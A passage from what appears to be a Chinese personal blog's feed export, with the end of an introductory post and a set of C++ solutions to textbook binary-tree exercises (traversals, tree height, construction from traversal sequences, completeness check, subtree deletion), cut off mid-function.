<h1 id="搭建博客的目的"><a href="#搭建博客的目的" class="headerlink" title="搭建博客的目的"></a>搭建博客的目的</h1><p>一方面是想锻炼自己的表达能力（我在这方面确实有所欠缺），另一方面也是想将自己感兴趣的内容分享出去，既加深了自己对知识的理解，也能让他人学到新东西。</p>
<h1 id="博客的内容"><a href="#博客的内容" class="headerlink" title="博客的内容"></a>博客的内容</h1><p>包含但不限于编程、游戏、数码相关内容，只要是我觉得有分享价值的东西，都有可能出现在博文中。</p>
]]></content>
      <categories>
        <category>经验</category>
      </categories>
      <tags>
        <tag>经验</tag>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构编程题 二叉树</title>
    <url>/2023/08/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BC%96%E7%A8%8B%E9%A2%98%20%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    <content><![CDATA[<h1 id="二叉树定义"><a href="#二叉树定义" class="headerlink" title="二叉树定义"></a>二叉树定义</h1><p>以下为本文解题代码的二叉树定义。</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">TreeNode</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> val<span class="token punctuation">;</span>
	TreeNode<span class="token operator">*</span> left<span class="token punctuation">,</span> <span class="token operator">*</span>right<span class="token punctuation">;</span>
	<span class="token function">TreeNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> val <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> TreeNode<span class="token operator">*</span> left <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">,</span> TreeNode<span class="token operator">*</span> right <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span>
		<span class="token operator">:</span> <span class="token function">val</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">left</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">right</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>

<h1 id="非递归先序遍历"><a href="#非递归先序遍历" class="headerlink" title="非递归先序遍历"></a>非递归先序遍历</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>编写先序遍历二叉树的非递归算法。</p>
<h2 id="解题代码"><a href="#解题代码" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">nonRecurPre</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>
	stack<span class="token operator">&lt;</span>TreeNode<span class="token operator">*</span><span class="token operator">></span> s<span class="token punctuation">;</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span>root <span class="token operator">!=</span> <span class="token keyword">nullptr</span> <span class="token operator">||</span> <span class="token operator">!</span>s<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			cout <span class="token operator">&lt;&lt;</span> root<span class="token operator">-></span>val <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>
			s<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>
			root <span class="token operator">=</span> root<span class="token operator">-></span>left<span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
			root <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			s<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			root <span class="token operator">=</span> root<span class="token operator">-></span>right<span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="非递归后序遍历"><a href="#非递归后序遍历" class="headerlink" title="非递归后序遍历"></a>非递归后序遍历</h1><h2 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h2><p>编写后序遍历二叉树的非递归算法。</p>
<h2 id="解题代码-1"><a href="#解题代码-1" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">nonRecurPost</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>
	stack<span class="token operator">&lt;</span>TreeNode<span class="token operator">*</span><span class="token operator">></span> s<span class="token punctuation">;</span>
	TreeNode<span class="token operator">*</span> pre <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span>root <span class="token operator">!=</span> <span class="token keyword">nullptr</span> <span class="token operator">||</span> <span class="token operator">!</span>s<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span>root <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			s<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>
			root <span class="token operator">=</span> root<span class="token operator">-></span>left<span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		root <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		s<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>root<span class="token operator">-></span>right <span class="token operator">==</span> <span class="token keyword">nullptr</span> <span class="token operator">||</span> root<span class="token operator">-></span>right <span class="token operator">==</span> pre<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			cout <span class="token operator">&lt;&lt;</span> root<span class="token operator">-></span>val <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>
			pre <span class="token operator">=</span> root<span class="token punctuation">;</span>
			root <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
			s<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>
			root <span class="token operator">=</span> root<span class="token operator">-></span>right<span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="反向层序遍历"><a href="#反向层序遍历" class="headerlink" title="反向层序遍历"></a>反向层序遍历</h1><h2 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h2><p>试给出二叉树的自下而上、从右到左的层序遍历算法。</p>
<h2 id="解题代码-2"><a href="#解题代码-2" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">reOrderTraversal</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	queue<span class="token operator">&lt;</span>TreeNode<span class="token operator">*</span><span class="token operator">></span> Q<span class="token punctuation">;</span>
	stack<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> S<span class="token punctuation">;</span>
	Q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>Q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		TreeNode<span class="token operator">*</span> fNode <span class="token operator">=</span> Q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		S<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>fNode<span class="token operator">-></span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>
		Q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>fNode<span class="token operator">-></span>left <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			Q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>fNode<span class="token operator">-></span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>fNode<span class="token operator">-></span>right <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			Q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>fNode<span class="token operator">-></span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>S<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		cout <span class="token operator">&lt;&lt;</span> S<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>
		S<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="非递归计算高度"><a href="#非递归计算高度" class="headerlink" title="非递归计算高度"></a>非递归计算高度</h1><h2 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h2><p>假设二叉树采用二叉链表存储结构，设计一个非递归算法求二叉树的高度。</p>
<h2 id="解题代码-3"><a href="#解题代码-3" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">nonRecurHeight</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	queue<span class="token operator">&lt;</span>TreeNode<span class="token operator">*</span><span class="token operator">></span> q<span class="token punctuation">,</span> nq<span class="token punctuation">;</span>
	q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			TreeNode<span class="token operator">*</span> fNode <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>fNode<span class="token operator">-></span>left <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				nq<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>fNode<span class="token operator">-></span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>fNode<span class="token operator">-></span>right <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				nq<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>fNode<span class="token operator">-></span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
		q <span class="token operator">=</span> <span class="token function">move</span><span class="token punctuation">(</span>nq<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token operator">++</span>res<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> res<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="根据中序和先序序列建立二叉树"><a href="#根据中序和先序序列建立二叉树" class="headerlink" title="根据中序和先序序列建立二叉树"></a>根据中序和先序序列建立二叉树</h1><h2 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h2><p>设一棵二叉树各结点的值互不相同，其先序遍历序列和中序遍历序列分别存储于两个一维数组 A 和 B 中，试编写算法建立该二叉树的二叉链表。</p>
<h2 id="解题代码-4"><a href="#解题代码-4" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp">TreeNode<span class="token operator">*</span> <span class="token function">recurCreate</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> preOrder<span class="token punctuation">,</span> <span class="token keyword">int</span> l1<span class="token punctuation">,</span> <span class="token keyword">int</span> r1<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> inOrder<span class="token punctuation">,</span> <span class="token keyword">int</span> l2<span class="token punctuation">,</span> <span class="token keyword">int</span> r2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>l1 <span class="token operator">==</span> r1<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>
	<span class="token keyword">auto</span> preBegin <span class="token operator">=</span> preOrder<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> l1<span class="token punctuation">,</span> preEnd <span class="token operator">=</span> preOrder<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> r1<span class="token punctuation">;</span>
	<span class="token keyword">auto</span> inBegin <span class="token operator">=</span> inOrder<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> l2<span class="token punctuation">,</span> inEnd <span class="token operator">=</span> inOrder<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> r2<span class="token punctuation">;</span>
	<span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token operator">*</span>preBegin<span class="token punctuation">;</span>
	TreeNode<span class="token operator">*</span> root <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">TreeNode</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">auto</span> it <span class="token operator">=</span> <span class="token function">find</span><span class="token punctuation">(</span>inBegin<span class="token punctuation">,</span> inEnd<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> lenL <span class="token operator">=</span> it <span class="token operator">-</span> inBegin<span class="token punctuation">;</span>
	root<span class="token operator">-></span>left <span class="token operator">=</span> <span class="token function">recurCreate</span><span class="token punctuation">(</span>preOrder<span class="token punctuation">,</span> l1 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> l1 <span class="token operator">+</span> lenL <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> inOrder<span class="token punctuation">,</span> l2<span class="token punctuation">,</span> l2 <span class="token operator">+</span> lenL<span class="token punctuation">)</span><span class="token punctuation">;</span>
	root<span class="token operator">-></span>right <span class="token operator">=</span> <span class="token function">recurCreate</span><span class="token punctuation">(</span>preOrder<span class="token punctuation">,</span> l1 <span class="token operator">+</span> lenL <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> r1<span class="token punctuation">,</span> inOrder<span class="token punctuation">,</span> l2 <span class="token operator">+</span> lenL <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> r2<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> root<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
TreeNode<span class="token operator">*</span> <span class="token function">createTree</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> preOrder<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> inOrder<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> l1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> r1 <span class="token operator">=</span> preOrder<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> l2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> r2 <span class="token operator">=</span> inOrder<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token function">recurCreate</span><span class="token punctuation">(</span>preOrder<span class="token punctuation">,</span> l1<span class="token punctuation">,</span> r1<span class="token punctuation">,</span> inOrder<span class="token punctuation">,</span> l2<span class="token punctuation">,</span> r2<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="判断完全二叉树"><a href="#判断完全二叉树" class="headerlink" title="判断完全二叉树"></a>判断完全二叉树</h1><h2 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h2><p>二叉树按二叉链表形式存储，试编写一个判别给定二叉树是否是完全二叉树的算法。</p>
<h2 id="解题代码-5"><a href="#解题代码-5" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">bool</span> <span class="token function">isCompleteBT</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	queue<span class="token operator">&lt;</span>TreeNode<span class="token operator">*</span><span class="token operator">></span> Q<span class="token punctuation">;</span>
	Q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">bool</span> isLeaves <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>Q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		TreeNode<span class="token operator">*</span> fNode <span class="token operator">=</span> Q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		Q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>fNode <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			isLeaves <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
			<span class="token keyword">continue</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>isLeaves<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
		Q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>fNode<span class="token operator">-></span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>
		Q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>fNode<span class="token operator">-></span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="计算双分支结点数"><a href="#计算双分支结点数" class="headerlink" title="计算双分支结点数"></a>计算双分支结点数</h1><h2 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h2><p>假设二叉树采用二叉链表存储结构存储，试设计一个算法，计算一棵给定二叉树的所有双分支结点个数。</p>
<h2 id="解题代码-6"><a href="#解题代码-6" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">doubleNodeCnt</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>root<span class="token operator">-></span>left <span class="token operator">!=</span> <span class="token keyword">nullptr</span> <span class="token operator">&amp;&amp;</span> root<span class="token operator">-></span>right <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> <span class="token number">1</span> <span class="token operator">+</span> <span class="token function">doubleNodeCnt</span><span class="token punctuation">(</span>root<span class="token operator">-></span>left<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">doubleNodeCnt</span><span class="token punctuation">(</span>root<span class="token operator">-></span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> <span class="token function">doubleNodeCnt</span><span class="token punctuation">(</span>root<span class="token operator">-></span>left<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">doubleNodeCnt</span><span class="token punctuation">(</span>root<span class="token operator">-></span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="交换左右子树"><a href="#交换左右子树" class="headerlink" title="交换左右子树"></a>交换左右子树</h1><h2 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h2><p>设树 B 是一棵采用链式结构存储的二叉树,编写一个把树 B 中所有结点的左右子树进行交换的算法。</p>
<h2 id="解题代码-7"><a href="#解题代码-7" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">swapLRNode</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>
	TreeNode<span class="token operator">*</span> temp <span class="token operator">=</span> root<span class="token operator">-></span>left<span class="token punctuation">;</span>
	root<span class="token operator">-></span>left <span class="token operator">=</span> root<span class="token operator">-></span>right<span class="token punctuation">;</span>
	root<span class="token operator">-></span>right <span class="token operator">=</span> temp<span class="token punctuation">;</span>
	<span class="token function">swapLRNode</span><span class="token punctuation">(</span>root<span class="token operator">-></span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">swapLRNode</span><span class="token punctuation">(</span>root<span class="token operator">-></span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="先序序列第k个结点值"><a href="#先序序列第k个结点值" class="headerlink" title="先序序列第k个结点值"></a>先序序列第k个结点值</h1><h2 id="题目描述-8"><a href="#题目描述-8" class="headerlink" title="题目描述"></a>题目描述</h2><p>假设二叉树采用二叉链表存储结构，设计一个算法，求先序遍历序列中第 k （1 &lt;= k &lt;= 链表中结点个数）个结点的值。</p>
<h2 id="解题代码-8"><a href="#解题代码-8" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">kthNodeVal</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">&amp;</span> k<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">--</span>k <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> root<span class="token operator">-></span>val<span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token function">kthNodeVal</span><span class="token punctuation">(</span>root<span class="token operator">-></span>left<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">kthNodeVal</span><span class="token punctuation">(</span>root<span class="token operator">-></span>right<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="删除特定值的结点的子树"><a href="#删除特定值的结点的子树" class="headerlink" title="删除特定值的结点的子树"></a>删除特定值的结点的子树</h1><h2 id="题目描述-9"><a href="#题目描述-9" class="headerlink" title="题目描述"></a>题目描述</h2><p>已知二叉树以二叉链表形式存储，编写算法完成：对于树中的每个元素值为 x 的结点，删除以它为根的子树，并释放相应的空间。</p>
<h2 id="解题代码-9"><a href="#解题代码-9" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">freeMemory</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>
	<span class="token function">freeMemory</span><span class="token punctuation">(</span>root<span class="token operator">-></span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">freeMemory</span><span class="token punctuation">(</span>root<span class="token operator">-></span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">delete</span> root<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">deleteXNode</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">,</span> <span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>
	<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>root<span class="token operator">-></span>val <span class="token operator">==</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">freeMemory</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
